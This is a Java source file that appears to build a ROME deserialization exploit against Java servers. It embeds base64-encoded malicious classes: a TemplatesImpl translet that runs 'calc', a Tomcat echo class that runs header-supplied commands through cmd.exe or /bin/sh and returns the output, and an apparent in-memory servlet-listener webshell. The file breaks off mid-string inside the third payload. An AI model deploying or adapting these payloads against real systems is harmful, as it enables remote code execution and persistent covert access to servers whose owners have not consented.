package rome;

import util.utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.io.Serializable;
import java.math.BigInteger;
import java.security.*;
import java.security.interfaces.DSAParams;
import java.security.interfaces.DSAPrivateKey;
import java.util.Base64;
import java.util.HashMap;

public class rome4 {
    public static void main(String[] args) throws Exception {
        String calc = "yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMdGVzdDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAoACwcAMAwAMQAyAQAEY2FsYwwAMwA0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADUBAAR0ZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAJAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAWAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAbAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADQAJABAADAAOAA0ADwAWABEADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==";

        String echo = "yv66vgAAADQBFgoAAgCIBwCJCgANAIoHAIsKAA0AjAoABACNCgCOAI8KAI4AkAgAkQoADQCSCgANAJMIAJQHAJUHAGUJABEAlgoADQCXBwCYCgARAJkKAJoAmwgAnAoADQCdBwCeCACfCACgCgBLAKEKAKIAowoAogCkCAClCgBKAKYHAIAKAKIApwgAqAoALwCpCACqCACrBwCsCACtCACuCACvCACwBwCxCwApALILACkAswgAtAgAtQgAtgcAtwgAuAoALwCNCgAvALkKALoAuwoAvAC9CgAvAL4IAL8KAMAAwQoALwDCCADDCADECADFCADGCADHBwDIBwDJCgA/AMoKAD8AywoAzADNCgA+AM4IAM8KAD4A0AoAPgDRCgAvANIKAEoA0woAFgDUBwDVBwDWAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR2YXI1AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAAR2YXIwAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyMQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHZhcjIBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyMwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQANU3RhY2tNYXBUYWJsZQcA1wcAlQcAiwEACkV4Y2VwdGlvbnMBAAl3cml0ZUJvZHkBABcoTGphdmEvbGFuZy9PYmplY3Q7W0IpVgEABHZhcjQBAAR2YXI2AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACW0IHAIkHAJ4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR0aGlzAQAMTFRvbWNhdEVjaG87AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAV2YXIxNQEAAWMBAAV2YXIxMgEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAV2YXIxNAEABXZhcjEwAQAFdmFyMTEBAAR2YXI5AQABSQEABHZhcjgBABBMamF2YS91dGlsL0xpc3Q7AQASTGphdmEvbGFuZy9UaHJlYWQ7AQABWgEAE1tMamF2YS9sYW5nL1RocmVhZDsHANUHANgHALcHALEHAHYBAApTb3VyY2VGaWxlAQAPVG9tY2F0RWNoby5qYXZhDADZANoBABBqYXZhL2xhbmcvT2JqZWN0DADbANwBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAN0A2gwAcQDeBwDXDADfAOAMAOEA4gEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwA4wDkDADlAOYBAAhzZXRCeXRlcwEAD2phdmEvbGFuZy9DbGFzcwwA5wBaDADoAOkBABFqYXZhL2xhbmcvSW50ZWdlcgwAcQDqBwDrDADsAO0BAAdkb1dyaXRlDADuAOkBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcgEABHdyYXAMAHEAcgcA2AwA7wDwDADxAPIBAAd0aHJlYWRzDABMAE0MAPMA9AEABGV4ZWMMAPUA9gEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsAQAKcHJvY2Vzc29ycwEADmphdmEvdXRpbC9MaXN0DAD3APgMAOEA+QEAA3JlcQEAC2dldFJlc3BvbnNlAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEABUV0YWdzDAD6APsHAPwMAP0BAAcBAQwBAgEDDABxAQQBAAdvcy5uYW1lBwEFDAEGAQcMAQgA9AEABndpbmRvdwEAB2NtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABxAQkMAQoBCwcBDAwBDQEODABxAQ8BAAJcQQwBEAERDAESAPQMARMBFAwAYABhDAEVAPQBAApUb21jYXRFY2hvAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQamF2YS9sYW5nL1RocmVhZAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAQoSSlWAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAARzaXplAQADKClJAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQAHaXNFbXB0eQEAAygpWgEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFKFtCKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACGdldEJ5dGVzAQAEKClbQgEACmdldE1lc3NhZ2UAIQBKAEsAAAAAAAUACgBMAE0AAgBOAAAA1QADAAUAAAA4AU0qtgABTi0SAqUAFi0rtgADTacADToELbYABU6n/+osxwAMuwAEWSu3AAa/LAS2AAcsKrYACLAAAQANABMAFgAEAAMATwAAADIADAAAAAwAAgAN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";

        String mem = "yv66vgAAADEBfQEAGWNoL3Fvcy9sb2diYWNrbnMvSlNPTlV0aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAMZ2V0Q2xhc3NOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQArY29tLmdvb2dsZS5nc28uU2VydmxldFJlcXVlc3RYZWRyeWlMaXN0ZW5lcggACAEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwAMAQAQamF2YS9sYW5nL1N0cmluZwcADgEL1Eg0c0lBQUFBQUFBQUFKVlhlVnhVMXhYK0xqUHdobUUwY1ZBRVRkT29VV0VZR0VXSkN0bEVRWWhBMUxFb0VwTStaaDd3ZEpnM3pudURZaHZUcGpaSjJ6VGRtNmI3a3BTMnNhMjJjVkNweHRnbGJib3Y2Yjd2VGR2LyswK2FmdmU5eHdERElQYjNtM25MdmVkODU5enZMUGUrRi81NzRSS0E5ZmkzUUczTUdJNE1Hc1pnUW9zTW1rWWtxcVZIRXBxMVJ6dVMwVXhydnhaUGorcWR1bWxwU1MydFFBZ3NPYVNPcUpHRW1oeU1iRXVvcHRscHFIRTU1Ukc0V1U0ZGk1Z09SQjdVRkVpeFFNbXRlbEszYmhmd1ZOZjBDSGkzR1hGTjRMcE9QYWwxWjRiN3RmUmV0VC9Ca1dDbkVWTVRQV3BhbCsvdW9OY2EwazJCdXM3L3cvWG1BQlQ0L1BCaW9jQ3k2czZDaTJpV3ZvaVl3Tkk1NWlYSTlSS2tuSEtENUtLNnI2VW1YN2FaYy8wQ1JYMHRBbVZ4YllCcnNzY0pTL0dPanRrS0FWUmhtWVJkTG5COTJuRi9PLzlwWTFTTEM2eHgzSjJMMk5ZUkxXblpycGVic3ljRVZsMkROcGwyN1hZd0xycWEwSTlMeStWVG5yWWVpMmtwU3plU0NsWnk0UzVtTEQyYXNveklOajAxUkhvRWZHbk5UQmxKazFIS2QzcklzbEtSZGw1eTloMUphaW1tWnBxRUZyaHBiaVZiZ3NJZW8vK1FUQlhidFl5bEp5SmRha3FDdUFzUVdEdXZaVnVRT2l2bVpVWkJuY0RxYThKVEVHR3NybTNSQ3RZTDNIajF0U3JZSUxCZ3hqSVZOSElvYXFteHczeHp5MkhSb0diTjlJUThWdGRjTmVwTXVjM1k0a2M5bWdUOFE1ck03bTUxMks2NHFaaEhyYlNlSEtUc3JiaXRGRVZndlpiU1dMc3Ruc3ZMR2JJMWhkVHZ4Tll5cklPc0I4ZFVqNXJJYUFGc2QyQmJtZlg1V2dwMk1KdGlSdEpTOVNSTFovbU1raDFTMDFHNWtHUk1hNjQ1RUVBSDd2S2pIVHNGS2dhblNHNUxHOE01Um5iUG40OE9NL25FelptM0FYU2gyMC8vN3lhRmRnemNKRjQ1aS94WmFSekFidXlSbkVRWnY2a1F0NnZta0IzbTEvalJnNFUrMURMZlV4bTZ2M242K3UvdVA2VEZyT2JaSXpXemh3TG94WUV5M0lJK0gxYjdzSmJOS2VQRGZleWlLYmFlQUZRbkJteFlQaHF5QThNS0toRFpBdFo2QW9oREs4TkdETkRQcmExUkg0YmNwcEhYR2hTd1pzdElVa2ZTdEZTR1RhQm16dXpKYnlzQkpERHN4MkdRMjFmUEVEQlRXb3laSFV0cjFrNXROTW8zQlNtdWhJWmFSaTJOZWVPdHJ1bHJDU0FOVXlhSTVmVGdBb1o3WkdzZjhlTUlqbEpKYms1U3RNT1JOTFZZSnExYm94RWFzVVZIY1Z6Njg3b1ppZXV3b3VCK3h3RzM1NWRYRityM0QrQU5mcHpBRzluSThpWVZ2RWxnNGFTK3MrOElWTTFHeVcxSmI4WkRmcHpFd3pJVnk1MEszZU5XNkxKSk5kMkl0R1FHQnJTMEZuZm1xUGRXdkUxbTRLTXNtc0l5Q2g2ek83b2FsL3V5d09McWd0WDlUcnpMajNmZzNRS0JmdFhVYnRtNFhZdloyM2xGb1FqTGFMd1g3NVBPdnA5Tk8yNjA2VWsxd1JPQjNFcmw1QWZ3aE9UMmd3RXNRWVVVK3pBeko2a2RuY3FjbVg3azh2eWorSmprNGVQRVlpbXJDVlB1endXeWx2M2lrL2lVcFA5SkZtNXVYNk40TWFscjY1bTMyQXEwdXB3VFkvaU05UG16Ym5kM1pydU5hQ1kyMUtacmlmaTBiZlJwSnRxSW1tNmMzUFhtbG0xMkpOZk43TTZ1VFdkdXZYTnJZS3BNRTBsckF3bktSR3c0VjVLYnlxSUNSNWFsYzJncHlETExTUXlqbWxDWkcvWW9UMS96TlArWnBnTTRoL015T2hlNGY4bGVtVWxwNlZqQzdrQmZrYlZ3RWhmendqV2pNcC8xNHhRdVU5ZlVySzJ4bU95aXpsR3crb0FVdUlLditqR09yN0VMRVR4dlo3cGFiL3dHbnBlSzMyVHM2YzN4NHpJajdleE5UNTV4OGs0LzhnRENneG1UMjh3azY0ZDFNMWJmc2pYYU9wbjBhUisrUjR3Qnc5MU5WOC9EMG1RLytBRitLRG40RVd2SXNlOVVvZzgvY1FxNlM3T0dETEorWndHOHZsbDRoZUxnSU5EVVQvRXphZXJuQXBWelNTbjRKWXRJVDQ0WWg3bUdMUVhJN0x0R2ZuK04zL2p4Sy94V1FhWGJLK3ZsUmxmZllqY0tILzdnYkowNTh2NUV1dzRCUHZ5Rkd0ckdSbTFEdzVZQnJiOHh2cVdoc2QrSHY1SGVZWVBIVEMzbXd6K1lBVWN6UTl6US9va1ZMRHN2cUE4UHI5elcrSVVqNU1uRnZtKzM3ejQrS2ZhMWxHK3QxQkM4THcyTjQ3cFE4TzluRVFzRlh6cUxPMExCZjUxRjJ4bE9GY0hQcTZ4b2lxRUNsU2pqVThCUjQzMkJEYzZQQWhkeUZ5V2xiR1dvZGh5TDU4ZGNUcFFiYk13S1I4L0ZsRStMRUNTcWtHM1FSYitOQzVSU3BhRmFUKzJsY2R4d09nZFhZcnQwMHpTbzBoeFVLWTFVMmxDdndvMHVWS090U2VmUDVFR3NuZ1loY2hEY2VBa3VJVlpNUW9nbnFhRnc3a3B0RnMyWHNhNHJISG9HZDV6SHRpS1cxZE5UTDN4b3k2THpDVHdlQ285alYzZjRQUFlLTkhrbjBOTTdqbjFOeFZYRndmMGN2TWVEZlh3OFdKZDd2TGZLNno1N2c2OGxUT3c4QmowSTZ1ZGdOSlZVbFJSUDRFaXZITTRpRTlUSGNTeUwxMCtncURlVXhZTlpQREtPdDFTVmhBajhkb0VzM3BQRjQxbDhLSXVQWlBHSnF1SXNudG8zaHVLbWtqRjR1OC9JQXhBNzFBUldNVGt1NGpMdkhwdVROa1lCcU9ab0NEV29SUVJoYkVJZFQ3VDEyTW0zSG02Zy9XaUFnUTBZNFRub1VSSjdqaElUUEhCZFJET1J0dUE1eGsxeTJpNVBHR2doNHMxa0xvTEh5UFVhMnRtRWg3Q1dOcnhFdlo5V1FpaVdyT2E0ditKeTc4TUZlaENtcjVzNHVnYmVWMmltUkVHUmdub0Y2eFEwS05pbzBMQlFzT28vRUMyOHlkanlsTXJycDZrankyT1ZIZjUyamtncllkRlZHOXgvRHA4TEh1VGxNaHE2eGxEVlhUdnR6ZGZrSFlPSHYvQnBPN2NYWVRFeGx0Q25sUktlM25MTDQ3aEVmWkdya2FpYlJaZU1RWGRkOE1SVHFLaGpma3dRYVVHVHR5NkxTOTFqcjd3VWZoNkJDWnpxWlpFODkyelltOFhYdzFUNDFtbjZ0d0Rsekw1VEx2OE5aQUVzWG40a2tMMGRuTzNnL0YyVTJNbVU3bVJDZDVHYlhXUjBONk1TcGZ4ZW0rdU45S09TLzgvakMxdzFQY0lYY2RwbWN6UE9NQjc4UENkUlg4S1hlZWUzR0o3QldUc1M0UHE4TDBOUk1LN2daTGVDVTZXQmFkUUplWFJ4Ri9zeWd5Z1hPeHI4L2puOHVDc2NmTkY3RVNkN1BjSDJhQmEvQ0RQTCtINmkxMVBMMTk5ZHh1OXp2OU5kd1Q5U2crejgyVU1OQ2d2ZVQxQ3F5VnRGTGg0TS9uVTZVcFYzTGh5N1h0ZlIrOGxzWFVhWGdBTzg5bkgwSHJKeGtPdTlsenpkWjdOeU8yZEttRU12Y0xWRm5ObHFQM2s0WDRkdmt4OHZOWGFRcysvWTFUK2F5OEJSZk5mbWJKUFRKWTdJeEpvaUJmOERQemJydjA4U0FBQT0IABABAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMABIAEwoADwAUAQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAFwEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEACGxpc3RlbmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY29udGV4dAEACGNvbnRleHRzAQAQTGphdmEvdXRpbC9MaXN0OwEABHRoaXMBABtMY2gvcW9zL2xvZ2JhY2tucy9KU09OVXRpbDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACQBABJqYXZhL3V0aWwvSXRlcmF0b3IHACYBAA1TdGFja01hcFRhYmxlDAASABYKAAQAKQEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMACsALAoAAgAtAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAvADALACUAMQEAB2hhc05leHQBAAMoKVoMADMANAsAJwA1AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA3ADgLACcAOQEAC2dldExpc3RlbmVyAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADsAPAoAAgA9AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAD8AQAoAAgBBAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBNAQAQamF2YS9sYW5nL09iamVjdAcATwEAEGphdmEvbGFuZy9UaHJlYWQHAFEBABFqYXZhL3V0aWwvSGFzaE1hcAcAUwEAE2phdmEvdXRpbC9BcnJheUxpc3QHAFUKAFYAKQEACmdldFRocmVhZHMIAFgBAAxpbnZva2VNZXRob2QBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWgBbCgACAFwBAAdnZXROYW1lDABeAAYKAFIAXwEAHENvbnRhaW5lckJhY2tncm91bmRQcm9jZXNzb3IIAGEBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAYwBkCgAPAGUBAAZ0YXJnZXQIAGcBAAVnZXRGVgwAaQBbCgACAGoBAAZ0aGlzJDAIAGwIAEQBAAZrZXlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwwAbwBwCgBUAHEBAA1qYXZhL3V0aWwvU2V0BwBzCwB0ADEBAANnZXQMAHYAPAoAVAB3AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAB5AHoKAFAAewEAD2phdmEvbGFuZy9DbGFzcwcAfQoAfgBfAQAPU3RhbmRhcmRDb250ZXh0CACAAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDACCAIMLACUAhAEAFVRvbWNhdEVtYmVkZGVkQ29udGV4dAgAhgEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAIgAiQoAUgCKAQAIdG9TdHJpbmcMAIwABgoAfgCNAQAZUGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcggAjwEAH1RvbWNhdEVtYmVkZGVkV2ViYXBwQ2xhc3NMb2FkZXIIAJEBAAlyZXNvdXJjZXMIAJMIAB0BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgcAlgEAGChMamF2YS9sYW5nL1Rocm93YWJsZ